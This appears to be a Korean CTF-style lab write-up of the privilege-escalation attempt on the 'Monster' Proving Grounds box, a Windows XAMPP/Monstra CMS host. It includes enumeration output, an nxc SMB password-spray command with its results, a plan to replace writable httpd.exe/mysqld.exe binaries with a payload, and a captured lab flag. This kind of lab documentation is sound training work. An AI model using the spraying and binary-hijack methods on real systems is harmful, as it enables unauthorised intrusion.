| # | 확인한 것 | 실측 결과 | 판정 | 출처 |
|---|---|---|---|---|
| 1 | `AlwaysInstallElevated` (HKLM·HKCU 둘 다) | 두 키 모두 존재하지 않음 | 성립 안 함 | `try4_alwaysinstallelevated_xampppw.log` |
| 2 | `C:\xampp\passwords.txt` | XAMPP 기본 배포 파일 그대로(`ppmax2011` 등 스톡 값) | 커스텀 값 없음 | `try4_...log` |
| 3 | 서비스 목록 중 `C:\WINDOWS` 밖 경로 | `edgeupdate`·`edgeupdatem`·`MicrosoftEdgeElevationService`·`uhssvc`·`VGAuthService`·`VMTools` 뿐. 전부 따옴표로 감싸진 경로, `vmtoolsd.exe` 는 `Everyone:(I)(RX)` — 쓰기 불가 | 비따옴표 경로 없음, 쓰기 가능 바이너리 없음 | `try3_services_tasks.log` |
| 4 | 스케줄 작업 중 `\Microsoft*` 아닌 것 | `OneDrive Reporting Task-S-1-5-21-...-1002` 하나 (mike 소유) | 상위 권한 작업 없음 | `try3_...log` |
| 5 | `my.ini`·`config.inc.php`·`php.ini` 의 `password` | 전부 주석·기본값. phpMyAdmin 은 `['password'] = ''` + `AllowNoPassword = true` | 재사용할 비밀번호 없음 | **페인만** |
| 6 | `netstat -ano` 리스너 | 80·443(Apache, PID 5268)·135·139·445·3389·5040 + 동적 RPC. 로컬 전용 서비스 없음, 3306 도 없음 | 로컬 공격면 없음 | `try_privesc_full_scrollback.log:903` |
| 7 | PowerShell 히스토리 | `ConsoleHost_history.txt` 내용이 `Restart-Computer` 한 줄 | 크리덴셜 없음 | `try_privesc...log:779` |
| 8 | `C:\output.txt` (플래그와 같은 타임스탬프) | PG 프로비저닝의 PowerShell 트랜스크립트(`Start time: 20260820040511`). `slmgr` 활성화 출력뿐 | 미끼 아님, 무관 | `try3_...log:188` |
| 9 | `net localgroup administrators` | 멤버가 `Administrator` 하나. mike 없음 | UAC 우회 경로 없음 | `try3_...log:260` |
| 10 | `cmdkey /list` | `* NONE *` | 저장된 크리덴셜 없음 | `try3_...log` |
| 11 | `unattend.xml`·`sysprep.*`·`*.kdbx`·`*.rdp`·`*.vnc` 전체 디스크 검색 | 0건. `web.config` 는 .NET 스톡뿐 | 자격증명 파일 없음 | **페인만** (명령은 `try3_...log:448` 에 보이나 출력 전에 로그가 끊긴다) |
| 12 | 자동 시작 항목 | HKLM Run = `SecurityHealth`·`VMware User Process`. HKCU Run = Edge 자동실행. mike Startup = `xampp-control - Shortcut.lnk` | 심을 자리 없음 | `try6_autostart.log` |
| 13 | `$env:PATH` 각 디렉터리 쓰기 테스트 | 쓰기 가능한 곳이 `C:\Users\Mike\AppData\Local\Microsoft\WindowsApps` 하나뿐(mike 본인 디렉터리) | 상위 권한 프로세스가 안 지나감 | **페인만** |
| 14 | 핫픽스 | 최신이 `KB5012599`·`KB5012117`·`KB5011651` (전부 2022-04-18) | 커널 익스는 2022-04 이후 것만 후보 | **페인만** |
| 15 | MySQL / `INTO OUTFILE` / UDF | 서비스·프로세스·소켓(3306) 전부 없음. Monstra 는 DB 미사용 | 원리적으로 부재 → PE-2-b | 표 6번 + `try8_xampp_paths.log` |
| 16 | SAM 하이브 ACL (SeriousSAM, CVE-2021-36934) · 크리덴셜 재사용 | `icacls` 가 ACL 조차 못 읽고 `vssadmin` 도 거부 / `wazowski` 변형 5개 전부 `STATUS_LOGON_FAILURE` | → PE-2-c | `try5_sam_acl_shadow.log` · `try2_spray_admin.log` |

> [!danger] `C:\xampp` 바이너리 쓰기 권한이 이 표에 없는 이유 — 배제가 아니라 미완이라서다
> `httpd.exe`·`mysqld.exe` 는 mike 가 실제로 덮어쓸 수 있음(`Authenticated Users:(M)`). 비어 있는 것은 「무엇이 이걸 SYSTEM 으로 재실행하는가」 한 조각뿐이고, 그 조각을 찾는 도중에 박스가 정지됨. **`PE-4` 참조 — 다시 붙는다면 거기부터.**

12번의 `xampp-control - Shortcut.lnk` 가 INTERACTIVE/CONSOLE LOGON 관측을 확정해 줌 — Apache 는 서비스가 아니라 mike 의 자동 로그온 세션에서 XAMPP Control Panel 이 띄우는 프로세스라 서비스 목록에 아예 없음. `SeImpersonatePrivilege` 가 없는 이유도 같음(서비스 계정을 거치지 않아 애초에 받은 적이 없음).

#### PE-2-b. MySQL 경로는 존재하지 않는다 — 조합만 보고 앞서간 추론

이 박스에서 제일 오래 붙든 오답 — 「XAMPP 니까 MySQL 이 돌고, `INTO OUTFILE`·UDF 로 파일을 쓸 수 있다」. 배너로 XAMPP 를 특정한 것까지는 맞았고, 거기에 「번들 구성요소가 전부 돌고 있다」는 반 걸음을 공짜로 얹은 것이 틀렸음. 세 층에서 무너짐.

**① 서비스로 등록돼 있지 않음.** XAMPP 기본 설치는 MySQL·Apache 를 SYSTEM 서비스로 등록할 수 있고, 그러면 웹 RCE 에서 서비스 바이너리 교체가 곧 SYSTEM 이 됨. 이 박스에는 XAMPP 서비스가 하나도 없음.

**② 프로세스로도 안 돎.** 3306 리스너 없음, `tasklist` 에 mysql 없음, `mysql.exe -u root -e "..."` 무응답(서버 미기동). 바이너리는 디스크에 존재(`mysql.exe`·`mysqld.exe`, 2019-09-08) — 깔려 있는 것과 도는 것은 다름. 설령 mike 로 `mysqld` 를 띄워도 그 프로세스는 mike 로 돌아 얻는 것이 없음.

```text
PATH 1 - mysqld service account (expected: SYSTEM)
  Get-CimInstance Win32_Service | ? PathName -like *xampp* -> EMPTY (no rows)
  sc.exe qc mysql -> [SC] OpenService FAILED 1060: service does not exist
  Get-WmiObject Win32_Process -Name mysqld -> EMPTY (not running)
  RESULT: there is NO XAMPP service on this box. mysqld is not a service and not running.

PATH 2 - MySQL root / INTO OUTFILE / UDF
  netstat 3306 -> nothing listening
  tasklist | findstr mysql -> nothing
  C:\xampp\mysql\bin\mysql.exe -u root -e "..." -> no output (cannot connect, server down)
  binaries present: mysql.exe (3,741,096), mysqld.exe (16,171,432) dated 2019-09-08
  RESULT: MySQL not running (Monstra 3.0.4 uses flat-file XML storage, not MySQL).
          Even if started manually it would run as mike -> no privilege gain.
```
— 출처: `~/PG/Monster/try8_xampp_paths.log`. ①②를 실행한 페인 원문은 스크롤백 저장(21:00 KST) 이후라 미보존이고, 이 파일이 박스 정지 직전에 값을 적어 둔 기록임. 다만 3306 부재는 별도로 되짚을 수 있음 — `PE-2` 표 6번 `netstat -ano | findstr LISTENING` 전문(`try_privesc_full_scrollback.log:903`)에 3306 이 없음.

**③ 애초에 쓸 DB 가 없음.** Monstra 3.0.4 는 플랫파일 CMS — 데이터가 전부 XML(`storage/database/*.table.xml`)이고, `engine/boot/defines.php` 의 `MONSTRA_DB_DSN` 정의가 주석 상태로 출하되며 ORM(Idiorm) 초기화가 그 상수에 걸려 있음. 클론한 소스(`~/PG/Monster/monstra-src`)로 확인.

그래서 `INTO OUTFILE`·UDF·`mysql` 크리덴셜 재사용은 막힌 경로가 아니라 **원리적으로 존재한 적이 없는 경로**임.

#### PE-2-c. SeriousSAM 도, 크리덴셜 재사용도 아니다

`SeImpersonate` 부재로 Potato 계열이 빠지면 다음 후보는 SAM 하이브 접근(CVE-2021-36934). 빈손이었음.

```powershell
PS C:\xampp\htdocs\blog\public\themes\default> echo ===SAM_ACL===; icacls C:\Windows\System32\config\SAM; echo ===SHADOW===; vssadmin list shadows; echo ===PF_ACL===; icacls "C:\Program Files\VMware\V
Mware Tools\vmtoolsd.exe"; echo ===XAMPP_ACL===; icacls C:\xampp; echo ===DONE===
===SAM_ACL===
Successfully processed 0 files; Failed processing 1 files
===SHADOW===
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Error: You don't have the correct permissions to run this command.  Please run this utility from a command
window that has elevated administrator privileges.

===PF_ACL===
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)
                                                  Everyone:(I)(RX)
                                                  NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files
===XAMPP_ACL===
C:\xampp BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
===DONE===
PS C:\xampp\htdocs\blog\public\themes\default>
```

`icacls` 가 SAM 에서 `Failed processing 1 files` = ACL 조차 못 읽음. SeriousSAM 은 `BUILTIN\Users` 에 `(RX)` 가 붙어 있어야 성립하는데 읽기 자체가 막힘. `vssadmin` 도 거부라 섀도카피 우회도 불가. 같은 출력의 `C:\xampp` `Authenticated Users:(M)` 는 배제 항목이 아니라 `PE-4` 의 미완 리드로 이어짐.

크리덴셜 재사용도 확인 — Monstra 의 `wazowski` 와 변형을 Administrator 계정에 SMB 로 시도.

```bash
nxc smb 192.168.248.180 -u Administrator -p pw_spray.txt
```

```text
SMB                      192.168.248.180 445    MIKE-PC          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MIKE-PC) (domain:Mike-PC) (signing:False) (SMBv1:False)
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:wazowski STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:Wazowski STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:monster STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:Monster STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:mike STATUS_LOGON_FAILURE
```
— 출처: `~/PG/Monster/try2_spray_admin.log`. 5개로 끊은 것은 의도 — 크리덴셜 재사용 확인이지 브루트포스가 아님. 로컬 계정 잠금 정책을 모르는 상태에서 대량으로 던지면 Administrator 가 잠겨 박스를 못 쓰게 됨.

#### PE-3. 설명이 안 된 관측 둘

배제 목록을 다 태우고도 다른 관측과 연결하지 못한 것 둘. 그 자체로는 경로가 아니나, `PE-4` 미완 리드의 빠진 조각이 여기 있을 가능성이 있음.

**(가) 소유자를 못 읽는 `notepad.exe` 23개.** 프로세스 소유자 열거 중 포착.

```powershell
PS C:\xampp\htdocs\blog\public\themes\default> echo ===NETSTAT===; netstat -ano | findstr LISTENING; echo ===PROCOWN===; Get-WmiObject Win32_Process | select ProcessId,Name,@{n='Owner';e={$_.GetOwner(
).User}},ExecutablePath | ? { $_.Owner -ne 'mike' } | ft -auto -wrap; echo ===DONE===
...
===PROCOWN===

ProcessId Name                      Owner ExecutablePath
--------- ----                      ----- --------------
        0 System Idle Process
        4 System
...
     3660 notepad.exe
...
      788 notepad.exe
     2924 notepad.exe
      436 notepad.exe
     4316 notepad.exe
     7140 notepad.exe
```
— 출처: `~/PG/Monster/try_privesc_full_scrollback.log` 901~1005행. `notepad.exe` 행 정확히 23개(`grep -c`).

읽히는 것은 하나 — `Owner` 열이 비어 있음. `GetOwner()` 가 값을 못 냈다는 뜻이고 = mike 권한으로 그 프로세스 토큰을 열 수 없다는 뜻(필터가 `$_.Owner -ne 'mike'` 라 mike 소유 프로세스는 애초에 걸러짐). `ExecutablePath` 도 같은 이유로 공란. 다른 계정이 메모장 23개를 띄워 둔 상태.

**[가정]** 이 프로세스들이 세션 0(서비스 전용 세션)에 있다는 판독은 페인에서 나온 것이고 저장된 산출물에는 세션 번호 컬럼이 없음. 위 블록으로 확정되는 것은 「소유자 접근 거부」까지임.

어느 쪽이든 mike 로는 손댈 수 없음 — 상위 권한 프로세스에 붙으려면 `SeDebugPrivilege` 가 필요한데 특권 목록에 없음. 이미 다른 경로로 올라가 있어야 쓸 수 있는 것이라 진입 벡터는 아님. 관측만 남김.

**(나) 머신 개명 흔적**(`PE-1` 셋째 항목). 옛 이름 `DESKTOP-8OB2COP` 으로 남은 프로필 디렉터리·인증서·백업 경로는 **찾아보지 못함**(관측 없음). 이 단서를 다른 어떤 관측과도 연결하지 못했음.

#### PE-4. 미완 — 가장 유력한 리드 (다시 붙는다면 여기부터)

> [!danger] 이 절은 배제 목록이 아니다
> `PE-2` 의 16종은 「때려봤고 아니었다」이나, **이 경로는 「아니었다」가 아니라 「끝까지 못 갔다」**임. 조각 하나가 비어 있고 그 조각을 찾는 도중에 박스가 정지·리버트됨. 다시 붙는다면 `PE-2` 를 되풀이하지 말고 여기서 시작할 것.

**확인된 것 ① — 바이너리 두 개를 mike 가 덮어쓸 수 있음.**

```powershell
PS C:\...> icacls C:\xampp\mysql\bin\mysqld.exe
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              BUILTIN\Users:(I)(RX)
                              NT AUTHORITY\Authenticated Users:(I)(M)
PS C:\...> icacls C:\xampp\apache\bin\httpd.exe
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              BUILTIN\Users:(I)(RX)
                              NT AUTHORITY\Authenticated Users:(I)(M)
```

`Authenticated Users:(I)(M)` = Modify. mike 가 Authenticated Users 이므로 `httpd.exe`·`mysqld.exe` 둘 다 실제로 교체 가능. `C:\` 루트에 XAMPP 를 통째로 설치한 구성의 상속 ACL 이고, 이 박스의 의도된 취약점으로 보임.

**확인된 것 ② — 그런데 지금 그것을 실행하는 주체는 mike 임.**

```powershell
PS C:\...> Get-WmiObject Win32_Process -Filter "ProcessId=5268" | select ProcessId,Name,@{n='Owner';e={$_.GetOwner().User}} | fl
ProcessId : 5268
Name      : httpd.exe
Owner     : Mike
```

— 출처: ①②의 페인 원문은 스크롤백 저장(21:00 KST) 이후라 미보존이고, 같은 값이 `~/PG/Monster/try8_xampp_paths.log`(PATH 3)에 기록돼 있음. 위 두 블록의 `PS C:\...>` 는 프롬프트를 축약 표기한 것임.

앞의 관측이 여기서 한 점으로 모임 — `AutoAdminLogon=1` · `DefaultUserName=Mike` · `AutoLogonSID` 가 mike 본인(`-1002`) · `whoami /all` 의 `INTERACTIVE`+`CONSOLE LOGON` · Startup 폴더의 `xampp-control - Shortcut.lnk` · `Win32_Service` 에 XAMPP 항목 없음(`PE-2-b`). XAMPP 는 서비스가 아니라 mike 의 자동 로그온 데스크톱 세션에서 컨트롤 패널이 띄운 프로세스이므로, `httpd.exe` 를 페이로드로 바꾸고 지금 재시작해도 mike 로 다시 뜰 뿐임.

**남은 질문은 정확히 하나.**

> 무엇이 `C:\xampp` 밑 바이너리를 SYSTEM(또는 Administrator) 컨텍스트로 재실행할 수 있는가?

쓰기는 확보돼 있어 이 한 조각만 채우면 경로가 닫힘. 확인해야 할 후보 — **전부 미확인**.

- Session 0 의 `notepad.exe` 23개(`PE-3` 가). **[가정]** 다른 계정이 뭔가를 주기적으로 띄우고 있다면 그것이 트리거일 수 있음. 다만 확정된 것은 「`GetOwner()` 거부 = mike 소유 아님」까지이고 세션 번호·기동 주체·주기성 전부 미확인 — 이 연결 자체가 **[가정]**
- Administrator 가 주기적으로 로그온해 XAMPP Control Panel 을 띄우는 구성인지 — 로그온 이벤트 **미확인**
- 재부팅이 SYSTEM 컨텍스트에서 무엇을 실행하는지 — 자동 로그온 대상이 mike 라 그대로면 mike 로 뜸. `RunOnce`·`Winlogon\Userinit`·`Shell` 값 **미확인**
- XAMPP Control Panel(`xampp-control.exe`) 에 UAC 권한 상승 요청 매니페스트가 있는지 — **미확인**

절차상 주의 — `httpd.exe` 를 덮어쓰면 웹서비스가 죽고 그것이 곧 발판(`.chunk.php` RCE) 소멸임. 교체는 별도 리버스셸을 확보하고 원본을 백업해 되돌릴 수 있는 상태에서 할 것. `mysqld.exe` 는 아무도 실행하지 않으므로(`PE-2-b`) 교체해도 아무 일이 일어나지 않음 — **트리거를 먼저 찾고 대상을 고르는 순서**.

### Post-Exploitation

`local.txt` 만 확보. **2026-08-20 인스턴스의 값**임 — PG 는 박스를 다시 켤 때마다 플래그를 재생성함.

| 플래그 | 경로 | 값 |
|---|---|---|
| local | `C:\Users\mike\Desktop\local.txt` | `db85d2fa7033db43da92bb07dde4da5b` |
| proof | `C:\Users\Administrator\Desktop\proof.txt` (추정) | 미확보 |

**Proof.txt value:**
없음 — 권한상승 미완으로 proof.txt 에 접근하지 못함. 경로를 「추정」으로 남기는 이유는, mike 권한으로 `dir C:\Users\Administrator\Desktop` 을 치면 `Directory of C:\Users\Administrator` 헤더만 나오고 목록이 비기 때문 — 접근 거부이지 「파일 없음」이 아님(`try_privesc_full_scrollback.log:804`). `C:\Users` 에 `Administrator`·`Mike`·`Public` 세 디렉터리가 있다는 것까지는 확인됨.

#### 남긴 흔적

확인한 것만 적음. 전체 확인 원문은 `~/PG/Monster/traces_confirmed.log`.

**되돌린 것 (삭제 전후를 둘 다 찍어 확인):**

```text
===BEFORE_DEL===
 Directory of C:\xampp\htdocs\blog\public\themes\default

08/20/2026  04:39 AM                94 mon9x.chunk.php
               1 File(s)             94 bytes
               0 Dir(s)   6,906,793,984 bytes free
===DELETING===
===AFTER_DEL===
 Directory of C:\xampp\htdocs\blog\public\themes\default

===TEMPCHECK===
 Directory of C:\Windows\Temp


 Directory of C:\Windows\Temp

===DONE===
```

- 타겟 `mon9x.chunk.php` — 삭제 확인. Monstra 는 chunk 를 파일로 저장하므로 파일 삭제가 곧 chunk 삭제임
- 타겟 `C:\Windows\Temp` — `*.ps1`·`*.exe` 없음(원래 남긴 것이 없었음). 위 `===TEMPCHECK===` 블록이 그 확인
- Kali `/etc/hosts` 의 `192.168.248.180 monster.pg` — 원복 확인. `sudo sed -i '/monster\.pg/d' /etc/hosts` 후 `grep` 무매치(exit 1). 원본은 `~/PG/Monster/hosts.before_revert` 에 보존, 다른 박스 항목 미접촉
- Kali 리스너 — `ss -lntp` 에 443/80/53 잔존 리스너 없음(광범위 `pkill` 미사용)

**박스 리버트로 타겟 흔적은 전부 소멸함.** 아래 타겟 항목은 리버트 이전 시점의 기록임.

- `mike` 로 돌던 PowerShell 리버스셸(tcp/443) — 박스와 함께 소멸
- 두 번째로 심으려던 `mon9y.chunk.php` — 박스가 이미 내려가 `No route to host`, **타겟에 생성되지 않음**
- 리버트 전 잔존물: Apache 브루트포스 로그 약 44,000건(10k 런 20,000 + cewl 런 약 24,000), `admin` Monstra 로그인 기록, 업로드 실패 3건의 POST 로그, Windows 이벤트 로그. **어느 것도 지우지 않음** — 로그 삭제는 흔적을 더 남기고 되돌릴 수 없음. 한 시간 안에 한 IP 에서 같은 엔드포인트로 4만 건의 실패 POST 는 어떤 로그 상관분석에도 걸리므로, 보고서에는 이 규모를 그대로 적을 것
- `harvest.ps1` 을 `%TEMP%` 에 올려 실행 중이었음 — 박스와 함께 소멸

**Kali 쪽 정리 (확인 완료):** 리스너 tmux 세션은 이름으로 종료(`ss -lntp` 에 443 잔존 없음, 광범위 `pkill` 미사용), base64 전송용 임시 청크 `hc_*`·`h.b64` 삭제. 산출물(`try1~try8_*.log`·`readd.py`·`exploit52038.py`·`traces_confirmed.log`)은 전부 보존.

**확인하지 않은 것 (「없음」이 아니라 「안 봤음」):**

- Windows 보안 이벤트 로그(4624/4688) — 조회한 적 없음
- `add_chunk` 익스플로잇이 Monstra 내부 로그·`storage` 에 남긴 부수효과 — 확인 안 함
- 실패한 업로드 3건(`shell.php7`·`t.txt`·`t.jpg`)이 themes 디렉터리 밖에 부분 파일을 남겼는지 — 확인 안 함
- 리버트 전 `harvest.ps1` 이 남긴 `%TEMP%\harv_out.txt`·`harvest.ps1` — 박스 소멸로 회수·정리 모두 불가
- 권한상승 열거 중 만든 `w.tmp` 쓰기 테스트 파일 — 생성 직후 `Remove-Item` 하도록 작성했으나 사후 확인 전에 박스가 내려감

## 관련

- EDB-52038 — Monstra CMS 3.0.4 RCE (themes → add_chunk). `/usr/share/exploitdb/exploits/php/webapps/52038.py`
- EDB-48479 / CVE-2017-18048 — filesmanager `.php7` 업로드. 이 박스는 업로드 기능이 죽어 있어 사용 불가
- EDB-49949 / CVE-2018-6383 — filesmanager `.pht`·`.phar` 업로드. 같은 이유로 사용 불가
- Monstra 소스 — `https://github.com/monstra-cms/monstra`(클론해 대조. `CHANGELOG.md` 기준 3.0.4 = 2016-04-05 이 마지막 릴리스)
- [[Jacko]] — 같은 「플래그 1개 + 권한상승 미완」 상태
- [[Squid]] · [[Hub]] · [[Levram]] — 버전 판정은 독립 근거 2개
- [[Hawat]] · [[Exfiltrated]] · [[Squid]] — 인용이 깨지면 인코딩으로 도망감(여기서는 base64 + `--data-urlencode`)
- [[Fowsniff]] — 사이트/OSINT 사전으로 크리덴셜을 뚫은 같은 부류
- [[_PLAYBOOK#A-2-24. 로그인 잠금이 «클라이언트 쿠키»에만 있으면 그것은 잠금이 아니다 — 그리고 손으로 하는 나를 잡는다]]
- [[_PLAYBOOK#A-2-25. 소스가 손에 있는데 «두드리기»부터 했다 — 「들어갈 수 있나」보다 「들어가면 뭘 할 수 있나」]]
- [[_PLAYBOOK#A-2-26. 업로드가 죽어 있다 — 「확장자 필터인가 기능 자체인가」부터 계층을 나눌 것]]
- [[_PLAYBOOK#A-2-27. 「확인 후 폐기한 벡터」를 표로 남길 것 — 배제 목록이 다음 사람의 지도다]]
- [[_PLAYBOOK#A-1-19. 생성한 사전·목록이 0줄인데 «조용하다» — 파이프라인이 실패를 삼킨다]]
- [[_PLAYBOOK#A-68. 작업이 «끊긴» 것을 실패로 적지 말 것 — 그리고 랩 측 티어다운은 게이트웨이 핑으로 확정한다]]
- [[_PLAYBOOK#B-2-12. 번들 스택의 구성요소가 «돈다»고 가정하지 말 것]]
- [[_PLAYBOOK#B-1-32. CMS 사용자명 «무료» 열거는 브루트포스 탐색공간을 두 자릿수로 줄인다]]
- [[_PLAYBOOK#B-6-10. 사이트 콘텐츠 기반 자체 사전이 rockyou 를 이긴다]]
- [[_PLAYBOOK#B-44. unquoted service path 를 봤을 때 잴 것은 «공백»이 아니라 `icacls` 의 `(AD)`·`(IO)`]] — `StartName` 습관
- [[_PLAYBOOK#B-84. 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다]] — SSH 두 겹 인용 깨짐
- [[_PLAYBOOK#C-5. 남긴 흔적]] — 약 44,000건 실패 POST 의 탐지 의미
- [[_STATUS]]
